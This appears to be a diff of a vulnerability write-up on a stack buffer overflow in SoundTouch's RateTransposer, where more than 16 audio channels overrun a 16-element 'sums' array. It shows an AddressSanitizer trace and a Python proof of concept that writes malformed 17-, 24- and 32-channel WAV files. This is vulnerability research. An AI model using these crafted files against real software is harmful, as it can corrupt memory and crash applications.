@@ -34,7 +34,7 @@ c
 
     assert(numChannels <= SOUNDTOUCH_MAX_CHANNELS);  // now allows 1..32
     LONG_SAMPLETYPE sums[16];                        // still 16
-    
+
     for (c = 0; c < numChannels; c++)
         sums[c] = 0;                                 // OOB write when c >= 16
 
@@ -124,7 +124,7 @@ plain text
         #3 soundtouch::RateTransposer::processSamples(...)  RateTransposer.cpp:168
         #4 soundtouch::RateTransposer::putSamples(...)      RateTransposer.cpp:124
         #5 soundtouch::SoundTouch::putSamples(...)          SoundTouch.cpp:297
-    
+
       [32, 96) 'sums' (line 168) <== Memory access at offset 96 overflows this variable
 
 The `sums` buffer occupies bytes `[32, 96)` in the stack frame. 64 bytes for 16 `float`\-sized elements. The write at offset 96 is the 17th channel, one element past the end.
@@ -138,12 +138,12 @@ python
 
     #!/usr/bin/env python3
     import struct, math
-    
+
     SUB_FORMAT_PCM = (
         b'\\x01\\x00\\x00\\x00\\x00\\x00\\x10\\x00'
         b'\\x80\\x00\\x00\\xaa\\x00\\x38\\x9b\\x71'
     )
-    
+
     def write_wav(filename, num_channels, sample_rate=44100, duration_sec=1):
         bits = 16
         num_samples = sample_rate * duration_sec
@@ -151,7 +151,7 @@ python
         block_align = num_channels * bytes_per_sample
         byte_rate = sample_rate * block_align
         data_size = num_samples * block_align
-    
+
         pcm = bytearray()
         for i in range(num_samples):
             for ch in range(num_channels):
@@ -163,14 +163,14 @@ python
                     val = (ch * 100 + 0.5) / 32768.0
                 sample = max(-32768, min(32767, int(val * 32767)))
                 pcm += struct.pack('<h', sample)
-    
+
         cb_size = 22
         fmt_chunk = struct.pack('<HHIIHHH',
             0xFFFE, num_channels, sample_rate, byte_rate,
             block_align, bits, cb_size)
         fmt_chunk += struct.pack('<HI', bits, 0)
         fmt_chunk += SUB_FORMAT_PCM
-    
+
         riff_size = 4 + (8 + len(fmt_chunk)) + (8 + data_size)
         with open(filename, 'wb') as f:
             f.write(b'RIFF')
@@ -182,7 +182,7 @@ python
             f.write(b'data')
             f.write(struct.pack('<I', data_size))
             f.write(pcm)
-    
+
     write_wav('evil_17ch.wav', 17)   # minimum overflow: 4 bytes
     write_wav('evil_24ch.wav', 24)   # moderate: 32 bytes
     write_wav('evil_32ch.wav', 32)   # maximum: 64 bytes
